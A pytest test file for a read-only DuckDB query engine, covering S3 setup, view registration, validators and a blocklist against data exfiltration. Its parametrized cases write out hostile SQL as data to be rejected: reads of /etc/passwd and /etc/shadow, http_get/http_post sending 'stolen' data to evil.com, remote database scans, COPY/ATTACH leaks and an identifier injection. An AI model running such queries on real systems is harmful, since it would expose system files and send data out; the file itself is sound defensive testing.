"""Tests for engine — DuckDB query engine."""

from __future__ import annotations

from unittest.mock import MagicMock, patch

import pyarrow as pa
import pytest

from rat_query.config import S3Config
from rat_query.engine import (
    _MAX_QUERY_LENGTH,
    QueryEngine,
    _quote_ns_table_refs,
    _strip_sql_comments,
    _validate_identifier,
    _validate_schema,
)


class TestQueryEngine:
    def test_creates_connection_on_init(self, s3_config: S3Config):
        with patch("rat_query.engine.duckdb.connect") as mock_connect:
            mock_conn = MagicMock()
            mock_connect.return_value = mock_conn
            engine = QueryEngine(s3_config)

        mock_connect.assert_called_once_with(":memory:")
        assert engine._conn is mock_conn

    def test_configures_s3_extensions(self, s3_config: S3Config):
        with patch("rat_query.engine.duckdb.connect") as mock_connect:
            mock_conn = MagicMock()
            mock_connect.return_value = mock_conn
            QueryEngine(s3_config)

        calls = mock_conn.execute.call_args_list
        assert any("httpfs" in str(c) for c in calls)
        assert any("iceberg" in str(c) for c in calls)
        assert any("s3_endpoint" in str(c) for c in calls)

    def test_skips_session_token_when_empty(self, s3_config: S3Config):
        with patch("rat_query.engine.duckdb.connect") as mock_connect:
            mock_conn = MagicMock()
            mock_connect.return_value = mock_conn
            QueryEngine(s3_config)

        calls = [str(c) for c in mock_conn.execute.call_args_list]
        assert not any("s3_session_token" in c for c in calls)

    def test_sets_session_token_when_present(self):
        config = S3Config(
            endpoint="localhost:9000",
            access_key="ak",
            secret_key="sk",
            bucket="test-bucket",
            session_token="sts-token-abc",
        )
        with patch("rat_query.engine.duckdb.connect") as mock_connect:
            mock_conn = MagicMock()
            mock_connect.return_value = mock_conn
            QueryEngine(config)

        calls = [str(c) for c in mock_conn.execute.call_args_list]
        assert any("s3_session_token" in c for c in calls)

    def test_register_view(self, s3_config: S3Config):
        with patch("rat_query.engine.duckdb.connect") as mock_connect:
            mock_conn = MagicMock()
            mock_connect.return_value = mock_conn
            engine = QueryEngine(s3_config)
            engine.register_view("silver", "orders", "s3://bucket/ns/data/silver/orders")

        calls = [str(c) for c in mock_conn.execute.call_args_list]
        assert any('CREATE SCHEMA IF NOT EXISTS "silver"' in c for c in calls)
        assert any('"silver"."orders"' in c for c in calls)
        assert any("read_parquet" in c for c in calls)

    def test_register_view_with_namespace(self, s3_config: S3Config):
        with patch("rat_query.engine.duckdb.connect") as mock_connect:
            mock_conn = MagicMock()
            mock_connect.return_value = mock_conn
            engine = QueryEngine(s3_config)
            engine.register_view(
                "silver",
                "orders",
                "s3://bucket/ns/data/silver/orders",
                namespace="default",
            )

        calls = [str(c) for c in mock_conn.execute.call_args_list]
        # Default catalog registration
        assert any('CREATE SCHEMA IF NOT EXISTS "silver"' in c for c in calls)
        assert any('"silver"."orders"' in c for c in calls)
        # Namespace catalog registration
        assert any("ATTACH" in c and '"default"' in c for c in calls)
        assert any('"default"."silver"' in c for c in calls)
        assert any('"default"."silver"."orders"' in c for c in calls)

    def test_drop_all_views(self, s3_config: S3Config):
        with patch("rat_query.engine.duckdb.connect") as mock_connect:
            mock_conn = MagicMock()
            mock_connect.return_value = mock_conn
            engine = QueryEngine(s3_config)
            engine.drop_all_views()

        calls = [str(c) for c in mock_conn.execute.call_args_list]
        assert any("DROP SCHEMA IF EXISTS bronze CASCADE" in c for c in calls)
        assert any("DROP SCHEMA IF EXISTS silver CASCADE" in c for c in calls)
        assert any("DROP SCHEMA IF EXISTS gold CASCADE" in c for c in calls)

    def test_query_arrow_with_limit(self, s3_config: S3Config):
        table = pa.table({"x": [1, 2, 3]})
        reader = pa.RecordBatchReader.from_batches(table.schema, table.to_batches())

        with patch("rat_query.engine.duckdb.connect") as mock_connect:
            mock_conn = MagicMock()
            mock_connect.return_value = mock_conn
            mock_result = MagicMock()
            mock_result.arrow.return_value = reader
            mock_conn.execute.return_value = mock_result

            engine = QueryEngine(s3_config)
            result = engine.query_arrow("SELECT * FROM silver.orders", limit=100)

        assert isinstance(result, pa.Table)
        assert len(result) == 3
        # Verify the SQL was wrapped with LIMIT (skip SET/RESET timeout calls)
        sql_calls = [c.args[0] for c in mock_conn.execute.call_args_list]
        limit_calls = [s for s in sql_calls if "LIMIT 100" in s]
        assert len(limit_calls) == 1

    def test_describe_table(self, s3_config: S3Config):
        with patch("rat_query.engine.duckdb.connect") as mock_connect:
            mock_conn = MagicMock()
            mock_connect.return_value = mock_conn
            mock_result = MagicMock()
            mock_result.fetchall.return_value = [
                ("id", "INTEGER", None, None, None, None),
                ("name", "VARCHAR", None, None, None, None),
            ]
            mock_conn.execute.return_value = mock_result

            engine = QueryEngine(s3_config)
            cols = engine.describe_table("silver", "orders")

        assert cols == [("id", "INTEGER"), ("name", "VARCHAR")]

    def test_count_rows(self, s3_config: S3Config):
        with patch("rat_query.engine.duckdb.connect") as mock_connect:
            mock_conn = MagicMock()
            mock_connect.return_value = mock_conn
            mock_result = MagicMock()
            mock_result.fetchone.return_value = (42,)
            mock_conn.execute.return_value = mock_result

            engine = QueryEngine(s3_config)
            count = engine.count_rows("silver", "orders")

        assert count == 42

    def test_close_releases_connection(self, s3_config: S3Config):
        with patch("rat_query.engine.duckdb.connect") as mock_connect:
            mock_conn = MagicMock()
            mock_connect.return_value = mock_conn
            engine = QueryEngine(s3_config)
            engine.close()

        mock_conn.close.assert_called_once()

    @pytest.mark.parametrize(
        "sql",
        [
            "DROP TABLE silver.orders",
            "  DROP TABLE silver.orders",
            "INSERT INTO silver.orders VALUES (1)",
            "UPDATE silver.orders SET x = 1",
            "DELETE FROM silver.orders",
            "CREATE TABLE evil (x INT)",
            "ALTER TABLE silver.orders ADD y INT",
            "COPY silver.orders TO '/tmp/leak.csv'",
            "ATTACH '/tmp/evil.db'",
            "INSTALL spatial",
            "LOAD spatial",
            "IMPORT DATABASE '/tmp/evil'",
            "EXPORT DATABASE '/tmp/leak'",
            "SET enable_external_access = true",
            "PRAGMA database_list",
            "-- comment\nDROP TABLE silver.orders",
            "/* block */ DROP TABLE silver.orders",
        ],
    )
    def test_query_arrow_rejects_blocked_statements(self, s3_config: S3Config, sql: str):
        with patch("rat_query.engine.duckdb.connect") as mock_connect:
            mock_conn = MagicMock()
            mock_connect.return_value = mock_conn
            engine = QueryEngine(s3_config)

            with pytest.raises(ValueError, match="Only SELECT queries are allowed"):
                engine.query_arrow(sql)

    @pytest.mark.parametrize(
        "sql",
        [
            "SELECT * FROM silver.orders",
            "  SELECT 1",
            "WITH cte AS (SELECT 1) SELECT * FROM cte",
            "select * from silver.orders",  # lowercase
            "SELECT * FROM silver.orders -- comment at end",
        ],
    )
    def test_query_arrow_allows_select_queries(self, s3_config: S3Config, sql: str):
        table = pa.table({"x": [1]})
        reader = pa.RecordBatchReader.from_batches(table.schema, table.to_batches())

        with patch("rat_query.engine.duckdb.connect") as mock_connect:
            mock_conn = MagicMock()
            mock_connect.return_value = mock_conn
            mock_result = MagicMock()
            mock_result.arrow.return_value = reader
            mock_conn.execute.return_value = mock_result

            engine = QueryEngine(s3_config)
            result = engine.query_arrow(sql)
            assert isinstance(result, pa.Table)

    def test_validate_identifier_rejects_injection(self):
        with pytest.raises(ValueError, match="Invalid"):
            _validate_identifier("orders; DROP TABLE x", "test")

    def test_validate_identifier_allows_safe_names(self):
        assert _validate_identifier("orders_2024", "test") == "orders_2024"

    def test_validate_schema_rejects_unknown(self):
        with pytest.raises(ValueError, match="Invalid schema"):
            _validate_schema("public")

    def test_validate_schema_allows_medallion_layers(self):
        assert _validate_schema("bronze") == "bronze"
        assert _validate_schema("silver") == "silver"
        assert _validate_schema("gold") == "gold"


class TestStripSqlComments:
    def test_strips_line_comments(self):
        assert _strip_sql_comments("-- comment\nSELECT 1") == "SELECT 1"

    def test_strips_block_comments(self):
        assert _strip_sql_comments("/* block */ SELECT 1") == "SELECT 1"

    def test_strips_multiline_block_comments(self):
        sql = "/* first line\nsecond line */\nSELECT 1"
        assert _strip_sql_comments(sql) == "SELECT 1"

    def test_preserves_valid_sql(self):
        assert _strip_sql_comments("SELECT * FROM t") == "SELECT * FROM t"


class TestQuoteNsTableRefs:
    def test_quotes_three_part_ref_with_bronze(self):
        assert (
            _quote_ns_table_refs("SELECT * FROM default.bronze.orders")
            == 'SELECT * FROM "default"."bronze"."orders"'
        )

    def test_quotes_three_part_ref_with_silver(self):
        assert (
            _quote_ns_table_refs("SELECT * FROM prod.silver.users")
            == 'SELECT * FROM "prod"."silver"."users"'
        )

    def test_quotes_three_part_ref_with_gold(self):
        assert (
            _quote_ns_table_refs("SELECT * FROM dev.gold.revenue")
            == 'SELECT * FROM "dev"."gold"."revenue"'
        )

    def test_leaves_two_part_ref_unchanged(self):
        assert _quote_ns_table_refs("SELECT * FROM bronze.orders") == "SELECT * FROM bronze.orders"

    def test_leaves_bare_table_unchanged(self):
        assert _quote_ns_table_refs("SELECT * FROM orders") == "SELECT * FROM orders"

    def test_handles_multiple_refs(self):
        sql = "SELECT * FROM default.bronze.orders o JOIN default.silver.users u ON o.id = u.id"
        result = _quote_ns_table_refs(sql)
        assert '"default"."bronze"."orders"' in result
        assert '"default"."silver"."users"' in result

    def test_preserves_aliases_and_other_sql(self):
        sql = "SELECT o.id, o.name FROM default.bronze.orders o WHERE o.id > 1"
        result = _quote_ns_table_refs(sql)
        assert '"default"."bronze"."orders" o WHERE' in result


class TestBlockedFunctions:
    """Tests for the function-level blocklist that prevents data exfiltration."""

    @pytest.mark.parametrize(
        "sql",
        [
            "SELECT * FROM read_parquet('/etc/passwd')",
            "SELECT * FROM read_parquet('s3://secret-bucket/data.parquet')",
            "SELECT * FROM read_csv_auto('/tmp/data.csv')",
            "SELECT * FROM read_csv('/tmp/data.csv')",
            "SELECT * FROM read_json_auto('http://evil.com/data.json')",
            "SELECT * FROM read_json('/tmp/data.json')",
            "SELECT * FROM read_text('/etc/shadow')",
            "SELECT * FROM read_blob('/tmp/binary')",
            "SELECT * FROM parquet_scan('s3://bucket/file.parquet')",
            "SELECT * FROM parquet_metadata('file.parquet')",
            "SELECT * FROM parquet_schema('file.parquet')",
            "SELECT * FROM csv_scan('/tmp/data.csv')",
            "SELECT * FROM json_scan('/tmp/data.json')",
            "SELECT * FROM read_ndjson_auto('/tmp/data.ndjson')",
            "SELECT * FROM read_ndjson('/tmp/data.ndjson')",
            "SELECT http_get('http://evil.com/exfil?data=stolen')",
            "SELECT http_post('http://evil.com/exfil', 'stolen_data')",
            "SELECT * FROM postgres_scan('host=evil.com', 'public', 'users')",
            "SELECT * FROM sqlite_scan('/tmp/evil.db', 'users')",
            "SELECT * FROM mysql_scan('host=evil.com', 'db', 'users')",
            "SELECT * FROM glob('/etc/*')",
        ],
    )
    def test_query_arrow_rejects_blocked_functions(self, s3_config: S3Config, sql: str):
        with patch("rat_query.engine.duckdb.connect") as mock_connect:
            mock_conn = MagicMock()
            mock_connect.return_value = mock_conn
            engine = QueryEngine(s3_config)

            with pytest.raises(
                ValueError, match="Direct file/URL access functions are not allowed"
            ):
                engine.query_arrow(sql)

    def test_blocked_function_case_insensitive(self, s3_config: S3Config):
        with patch("rat_query.engine.duckdb.connect") as mock_connect:
            mock_conn = MagicMock()
            mock_connect.return_value = mock_conn
            engine = QueryEngine(s3_config)

            with pytest.raises(
                ValueError, match="Direct file/URL access functions are not allowed"
            ):
                engine.query_arrow("SELECT * FROM READ_PARQUET('/etc/passwd')")

    def test_blocked_function_in_cte(self, s3_config: S3Config):
        sql = "WITH leaked AS (SELECT * FROM read_parquet('/etc/passwd')) SELECT * FROM leaked"
        with patch("rat_query.engine.duckdb.connect") as mock_connect:
            mock_conn = MagicMock()
            mock_connect.return_value = mock_conn
            engine = QueryEngine(s3_config)

            with pytest.raises(
                ValueError, match="Direct file/URL access functions are not allowed"
            ):
                engine.query_arrow(sql)

    def test_blocked_function_in_subquery(self, s3_config: S3Config):
        sql = "SELECT * FROM (SELECT * FROM read_csv_auto('/tmp/data.csv')) AS sub"
        with patch("rat_query.engine.duckdb.connect") as mock_connect:
            mock_conn = MagicMock()
            mock_connect.return_value = mock_conn
            engine = QueryEngine(s3_config)

            with pytest.raises(
                ValueError, match="Direct file/URL access functions are not allowed"
            ):
                engine.query_arrow(sql)

    def test_blocked_function_hidden_in_line_comment(self, s3_config: S3Config):
        sql = "-- innocent comment\nSELECT * FROM read_parquet('/etc/passwd')"
        with patch("rat_query.engine.duckdb.connect") as mock_connect:
            mock_conn = MagicMock()
            mock_connect.return_value = mock_conn
            engine = QueryEngine(s3_config)

            with pytest.raises(
                ValueError, match="Direct file/URL access functions are not allowed"
            ):
                engine.query_arrow(sql)

    def test_blocked_function_hidden_in_block_comment(self, s3_config: S3Config):
        sql = "/* sneaky */ SELECT * FROM read_parquet('/etc/passwd')"
        with patch("rat_query.engine.duckdb.connect") as mock_connect:
            mock_conn = MagicMock()
            mock_connect.return_value = mock_conn
            engine = QueryEngine(s3_config)

            with pytest.raises(
                ValueError, match="Direct file/URL access functions are not allowed"
            ):
                engine.query_arrow(sql)

    def test_normal_select_still_works(self, s3_config: S3Config):
        """Ensure normal SELECT queries are not blocked by the function filter."""
        table = pa.table({"x": [1]})
        reader = pa.RecordBatchReader.from_batches(table.schema, table.to_batches())

        with patch("rat_query.engine.duckdb.connect") as mock_connect:
            mock_conn = MagicMock()
            mock_connect.return_value = mock_conn
            mock_result = MagicMock()
            mock_result.arrow.return_value = reader
            mock_conn.execute.return_value = mock_result

            engine = QueryEngine(s3_config)
            result = engine.query_arrow("SELECT 1 AS x")
            assert isinstance(result, pa.Table)

    def test_select_with_cte_still_works(self, s3_config: S3Config):
        """Ensure CTE queries without blocked functions pass through."""
        table = pa.table({"x": [1]})
        reader = pa.RecordBatchReader.from_batches(table.schema, table.to_batches())

        with patch("rat_query.engine.duckdb.connect") as mock_connect:
            mock_conn = MagicMock()
            mock_connect.return_value = mock_conn
            mock_result = MagicMock()
            mock_result.arrow.return_value = reader
            mock_conn.execute.return_value = mock_result

            engine = QueryEngine(s3_config)
            result = engine.query_arrow("WITH cte AS (SELECT 1 AS x) SELECT * FROM cte")
            assert isinstance(result, pa.Table)

    def test_column_named_like_blocked_function_is_allowed(self, s3_config: S3Config):
        """A column named read_parquet (no parenthesis) should not trigger the block."""
        table = pa.table({"x": [1]})
        reader = pa.RecordBatchReader.from_batches(table.schema, table.to_batches())

        with patch("rat_query.engine.duckdb.connect") as mock_connect:
            mock_conn = MagicMock()
            mock_connect.return_value = mock_conn
            mock_result = MagicMock()
            mock_result.arrow.return_value = reader
            mock_conn.execute.return_value = mock_result

            engine = QueryEngine(s3_config)
            # No parenthesis after read_parquet — should not trigger the regex
            result = engine.query_arrow("SELECT read_parquet AS col FROM bronze.test")
            assert isinstance(result, pa.Table)


class TestQueryLengthLimit:
    """Tests for the query length limit that prevents abuse via huge queries."""

    def test_query_within_limit_is_allowed(self, s3_config: S3Config):
        table = pa.table({"x": [1]})
        reader = pa.RecordBatchReader.from_batches(table.schema, table.to_batches())

        with patch("rat_query.engine.duckdb.connect") as mock_connect:
            mock_conn = MagicMock()
            mock_connect.return_value = mock_conn
            mock_result = MagicMock()
            mock_result.arrow.return_value = reader
            mock_conn.execute.return_value = mock_result

            engine = QueryEngine(s3_config)
            result = engine.query_arrow("SELECT 1")
            assert isinstance(result, pa.Table)

    def test_query_at_exact_limit_is_allowed(self, s3_config: S3Config):
        table = pa.table({"x": [1]})
        reader = pa.RecordBatchReader.from_batches(table.schema, table.to_batches())

        with patch("rat_query.engine.duckdb.connect") as mock_connect:
            mock_conn = MagicMock()
            mock_connect.return_value = mock_conn
            mock_result = MagicMock()
            mock_result.arrow.return_value = reader
            mock_conn.execute.return_value = mock_result

            engine = QueryEngine(s3_config)
            # Pad to exactly the limit
            sql = "SELECT 1" + " " * (_MAX_QUERY_LENGTH - len("SELECT 1"))
            assert len(sql) == _MAX_QUERY_LENGTH
            result = engine.query_arrow(sql)
            assert isinstance(result, pa.Table)

    def test_query_exceeding_limit_is_rejected(self, s3_config: S3Config):
        with patch("rat_query.engine.duckdb.connect") as mock_connect:
            mock_conn = MagicMock()
            mock_connect.return_value = mock_conn
            engine = QueryEngine(s3_config)

            sql = "SELECT 1" + " " * _MAX_QUERY_LENGTH  # one byte over
            with pytest.raises(ValueError, match="Query too long"):
                engine.query_arrow(sql)

    def test_query_length_error_includes_sizes(self, s3_config: S3Config):
        with patch("rat_query.engine.duckdb.connect") as mock_connect:
            mock_conn = MagicMock()
            mock_connect.return_value = mock_conn
            engine = QueryEngine(s3_config)

            sql = "X" * (_MAX_QUERY_LENGTH + 1)
            with pytest.raises(ValueError, match=rf"{len(sql)} chars, max {_MAX_QUERY_LENGTH}"):
                engine.query_arrow(sql)

    def test_max_query_length_constant_value(self):
        assert _MAX_QUERY_LENGTH == 100_000
